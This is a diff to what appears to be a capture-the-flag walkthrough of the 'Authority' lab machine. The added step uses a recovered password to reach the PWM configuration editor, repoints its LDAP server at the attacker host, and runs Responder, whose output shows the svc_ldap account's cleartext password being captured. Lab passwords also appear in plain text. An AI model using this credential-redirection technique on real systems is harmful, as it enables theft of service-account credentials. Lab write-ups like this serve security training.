@@ -389,8 +389,22 @@ Decryption successful
 DevT3st@123        
 ```
 
-using the recovered pass is it possible to connect to the https://authority.htb:8443/pwm/private/config/manager endpoint
+using the recovered pass is it possible to connect to the https://authority.htb:8443/pwm/private/config/editor endpoint and change the ldap server to authenticate against the attacker host
 
+```
+sudo responder -I tun0
+```
+
+clicking on "Test LDAP profile"
+
+```
+[+] Listening for events...                                                                                     
+
+[LDAP] Cleartext Client   : 10.129.229.56
+[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
+[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
+[*] Skipping previously captured cleartext password for CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb                                                                                                             
+```
 
 ---
 ## Foothold
